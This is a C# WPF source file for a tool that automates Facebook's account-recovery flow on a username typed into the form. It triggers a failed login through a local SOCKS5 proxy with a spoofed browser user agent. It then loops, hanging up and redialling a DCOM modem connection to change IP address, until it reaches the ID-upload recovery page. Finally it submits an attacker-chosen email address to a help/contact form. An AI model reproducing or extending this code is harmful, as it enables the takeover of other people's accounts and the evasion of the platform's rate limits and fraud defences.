﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using DotRas;
using xNet;

namespace VS1
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            var request = new HttpRequest();
            var username = user.Text;
            var emailnew = email.Text;
            request.Cookies = new CookieDictionary();
            request.Proxy = Socks5ProxyClient.Parse("127.0.0.1:8889");
            request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36";
            var abc = request.Get("https://mbasic.facebook.com", null);
            var prams = new RequestParams();
            prams["lsd"] = "AVqWlW35";
            prams["m_ts"] = "1537344232";
            prams["li"] = "6AKiW_RaYG_QEECe5eGk4S6a";
            prams["try_number"] = "0";
            prams["unrecognized_tries"] = "0";
            prams["email"] = username;
            prams["pass"] = "";
            prams["login"] = "Đăng nhập";
            request.Post("https://mbasic.facebook.com/login.php?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=101&refid=8", prams);
            request.Get("https://mbasic.facebook.com/recover/initiate/?ars=facebook_login_pw_error", null);
            
            while (true)
            {
                try {
                    abc = request.Get("https://mbasic.facebook.com/recover/id_upload?cf=717123195037080&_rdr", null);
                    if (abc.Address.ToString().Contains("717123195037080"))
                        break;
                    //reset dcom
                    dcom("Wireless Terminal");
                }
                catch (Exception)
                {
                    continue;
                }
                
            }
            var sendfile = new RequestParams();
            sendfile["Field383518988459175"] = emailnew;
            request.Get("https://mbasic.facebook.com/help/contact/717123195037080?Field383518988459175=" + emailnew,null);
        }
        public static bool dcom(string name)
        {
            var dialer = new RasDialer();
            //dialer.StateChanged += new EventHandler<StateChangedEventArgs>(dialer_StateChanged);
            dialer.EntryName = name;
            dialer.PhoneBookPath = RasPhoneBook.GetPhoneBookPath(RasPhoneBookType.User);
            foreach (RasConnection connection in RasConnection.GetActiveConnections())
            {
                connection.HangUp();
            }
            // Depending on your application, you need to decide between using one of these methods:

            // Synchronously dial the connection. This method will throw an exception if the connection attempt fails.
            try
            {
                dialer.Dial();
                Thread.Sleep(2000);
                if (checkInternet())
                {
                    return true;
                }
            }
            catch (Exception)
            {
                return false;
            }
            return false;
        }
        public static bool checkInternet(uint port = 0)
        {
            //http://portal.fb.com/mobile/status.php
            Console.WriteLine($"Checking internet port {port}");
            try
            {
                HttpRequest r = new HttpRequest();
                if (port > 0)
                    r.Proxy = Socks5ProxyClient.Parse("127.0.0.1:" + port);
                r.UserAgent = "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Mobile Safari/537.36";
                r.ConnectTimeout = 10 * 1000;
                r.ReadWriteTimeout = 10 * 1000;
                r.Get("https://graph.facebook.com/");
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }
    }
}
